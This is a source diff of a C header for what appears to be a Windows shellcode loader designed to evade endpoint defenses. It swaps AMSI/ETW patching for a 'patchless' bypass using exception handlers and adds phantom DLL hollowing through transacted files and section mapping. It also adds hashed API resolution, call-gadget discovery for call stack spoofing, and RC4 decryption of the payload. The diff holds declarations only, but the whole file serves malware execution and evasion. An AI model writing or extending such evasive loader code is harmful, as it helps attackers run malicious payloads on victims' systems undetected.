@@ -33,11 +33,19 @@
 #pragma comment(linker, "/NODEFAULTLIB")
 #pragma intrinsic(__movsb)
 #pragma intrinsic(__stosb)
+#pragma intrinsic(__rdtsc)
 
 // ----------- Syscall Name Hashes (Jenkins One-at-a-Time 32-bit) -----------
 #define NtAllocateVirtualMemory_JOAAT   0xE33A06BF
 #define NtProtectVirtualMemory_JOAAT    0x82BB0EE0
 #define NtDelayExecution_JOAAT          0xC4714BC3
+#define NtCreateSection_JOAAT           0x9A538B2B
+#define NtMapViewOfSection_JOAAT        0xD3B060A1
+
+// ----------- Phantom DLL Hollowing Hashes (kernel32 exports) -----------
+#define ReadFile_JOAAT                  0x62BF1D54
+#define WriteFile_JOAAT                 0x8CFB9E0E
+#define SetFilePointer_JOAAT            0xCF8699F2
 
 // ----------- Thread Pool Hashes (ntdll exports, resolved via FetchExportAddress) -----------
 #define TpAllocWork_JOAAT               0xE6CACAE7
@@ -58,6 +66,10 @@
 #define NT_SUCCESS(Status)  ((NTSTATUS)(Status) >= 0)
 #endif
 
+#ifndef STATUS_SINGLE_STEP
+#define STATUS_SINGLE_STEP  0x80000004L
+#endif
+
 // ----------- Function Typedefs -----------
 typedef NTSTATUS(NTAPI* fnSystemFunction032)(PUSTRING Data, PUSTRING Key);
 typedef HMODULE (WINAPI* fnLoadLibraryA)(LPCSTR lpLibFileName);
@@ -69,6 +81,19 @@ typedef BOOL    (WINAPI* fnVirtualProtect)(LPVOID lpAddress, SIZE_T dwSize, DWOR
 typedef NTSTATUS(NTAPI* fnTpAllocWork)(PVOID* WorkReturn, PVOID Callback, PVOID Context, PVOID CallbackEnviron);
 typedef VOID    (NTAPI* fnTpPostWork)(PVOID Work);
 typedef VOID    (NTAPI* fnTpReleaseWork)(PVOID Work);
+
+// Patchless evasion typedefs (ntdll exports)
+typedef PVOID   (NTAPI* fnRtlAddVectoredExceptionHandler)(ULONG First, PVOID Handler);
+typedef VOID    (NTAPI* fnRtlCaptureContext)(PCONTEXT ContextRecord);
+typedef NTSTATUS(NTAPI* fnNtContinue)(PCONTEXT ThreadContext, BOOLEAN RaiseAlert);
+
+// Phantom DLL hollowing typedefs (ktmw32 / kernel32)
+typedef HANDLE  (WINAPI* fnCreateTransaction)(LPSECURITY_ATTRIBUTES, LPGUID, DWORD, DWORD, DWORD, DWORD, LPWSTR);
+typedef HANDLE  (WINAPI* fnCreateFileTransactedA)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE, HANDLE, PUSHORT, PVOID);
+typedef BOOL    (WINAPI* fnRollbackTransaction)(HANDLE);
+typedef BOOL    (WINAPI* fnReadFile)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
+typedef BOOL    (WINAPI* fnWriteFile2)(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED);
+typedef DWORD   (WINAPI* fnSetFilePointer)(HANDLE, LONG, PLONG, DWORD);
 
 // ----------- Resolved WinAPI Function Pointers -----------
 typedef struct _API_HASHING {
@@ -102,16 +127,19 @@ PVOID FetchExportAddress(IN PVOID pModuleBase, IN UINT32 dwApiNameHash);
 VOID IatCamouflage(VOID);
 
 // ----------- Evasion -----------
-BOOL PatchEtw(IN PAPI_HASHING pApi);
-BOOL PatchAmsi(IN PAPI_HASHING pApi);
+BOOL PatchlessAmsiEtw(IN PAPI_HASHING pApi);
 BOOL AntiAnalysis(VOID);
 
-// ----------- Module Stomping -----------
+// ----------- Module Stomping / Phantom DLL Hollowing -----------
 BOOL ModuleStomp(IN PAPI_HASHING pApi, IN PBYTE pShellcode, IN DWORD dwShellcodeSize, OUT PVOID* ppExecAddr);
+BOOL PhantomDllHollow(IN PAPI_HASHING pApi, IN PNTAPI_FUNC pNtApis, IN PBYTE pShellcode, IN DWORD dwShellcodeSize, OUT PVOID* ppExecAddr);
 
 // ----------- Call Stack Spoofing (ASM) -----------
-extern VOID SetSpoofTarget(PVOID pTarget);
+extern VOID SetSpoofTarget(PVOID pTarget, PVOID pCallGadget);
 extern VOID SpoofCallback(PVOID Instance, PVOID Context, PVOID Work);
+
+// ----------- Call Gadget Discovery -----------
+PVOID FindCallGadget(IN PVOID pModuleBase);
 
 // ----------- Crypto -----------
 BOOL Rc4DecryptPayload(IN PAPI_HASHING pApi, IN PBYTE pCipherText, IN DWORD dwCipherSize, IN PBYTE pKey, IN DWORD dwKeySize);
